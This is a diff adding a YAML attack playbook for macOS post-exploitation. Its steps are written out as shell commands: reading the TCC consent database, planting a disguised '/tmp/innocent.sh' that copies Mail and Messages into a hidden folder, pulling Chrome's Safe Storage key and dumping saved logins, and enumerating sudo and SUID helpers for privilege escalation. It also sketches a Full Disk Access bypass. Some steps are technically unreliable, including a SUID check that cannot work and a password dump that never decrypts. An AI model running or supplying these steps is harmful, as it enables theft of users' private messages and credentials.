@@ -1,0 +1,86 @@
+id: macos-tcc-bypass
+name: "macOS — TCC bypass + SUID helper abuse"
+description: >
+  macOS TCC (Transparency, Consent, and Control) gates access to camera,
+  mic, Documents, etc. Common bypasses target the per-user TCC.db (writable
+  in some configs), inherit consent via cross-process trickery, or piggy-back
+  on already-consented apps (Terminal, iTerm).
+tags: [macos, priv-esc, tcc, classic-macos]
+difficulty: medium
+
+inputs: []
+
+steps:
+  - id: macos_recon
+    name: "macOS recon"
+    inline_command: |
+      sw_vers
+      whoami; groups; id
+      csrutil status  # SIP on/off — SIP-off makes most attacks trivial
+      ls -la /Applications | grep -v '^d'  # SUID-flagged custom apps
+
+  - id: list_tcc_grants
+    name: "Inspect TCC.db (user-level — sometimes user-writable)"
+    inline_command: |
+      sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
+        "SELECT service, client, allowed FROM access;"
+
+  - id: piggyback_terminal
+    name: "Piggyback already-consented Terminal (most common path)"
+    inline_command: |
+      # If Terminal has Full Disk Access (most devs grant it), any process
+      # the user starts from Terminal inherits the consent.
+      # Drop a payload that the user will run from Terminal:
+      cat > /tmp/innocent.sh <<'EOF'
+      #!/bin/bash
+      cp -R ~/Library/Mail /tmp/.harvest/Mail 2>/dev/null
+      cp -R ~/Library/Messages /tmp/.harvest/Messages 2>/dev/null
+      # etc.
+      EOF
+      chmod +x /tmp/innocent.sh
+
+  - id: chrome_keychain
+    name: "Read browser Keychain (no TCC if you have the user's login pwd)"
+    inline_command: |
+      security find-generic-password -ga 'Chrome Safe Storage' -w
+      # Use the returned key to decrypt Chrome's Login Data sqlite:
+      python3 -c '
+      import sqlite3, sys, os
+      conn = sqlite3.connect(os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"))
+      for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
+          print(row[0], row[1], row[2])'
+
+  - id: dscl_groups
+    name: "macOS-specific privesc — admin group + sudo"
+    inline_command: |
+      dscl . -read /Groups/admin GroupMembership
+      sudo -l 2>/dev/null
+      # If your user is in `admin`, `sudo -s` after entering password = root.
+      # If sudoers has NOPASSWD on /usr/sbin/installer → install signed pkg
+      # → root code execution.
+
+  - id: kext_or_root_helper
+    name: "Custom SUID helpers (look in /Applications, /Library)"
+    inline_command: |
+      find /Applications /Library -perm -4000 -type f 2>/dev/null
+      # Many legacy apps ship SUID-root helpers in /Applications/*.app/Contents/.
+      # Audit them as you would a Linux SUID — strings, ltrace alternative is
+      # `dtruss -f -t open <binary>` or DTrace probes.
+
+  - id: full_disk_access_bypass
+    name: "Bypass Full Disk Access (TCCPlus / external drive trick)"
+    inline_command: |
+      # 1) Mount an external drive: cp ~/Library to /Volumes/USB/Library
+      # 2) macOS doesn't apply TCC to external volumes by default.
+      # 3) Read the copied DB freely.
+
+references:
+  - title: "Csaba Fitzl — TCC bypasses"
+    url:   "https://theevilbit.github.io/posts/macos_tcc_dance_with_the_devil/"
+  - title: "Objective-See — macOS attacker tooling"
+    url:   "https://objective-see.org/blog.html"
+
+next_chains:
+  - chain: shell-stabilization
+    when:   'shell needs cleanup'
+    reason: 'macOS reverse shells need the same TTY upgrade.'
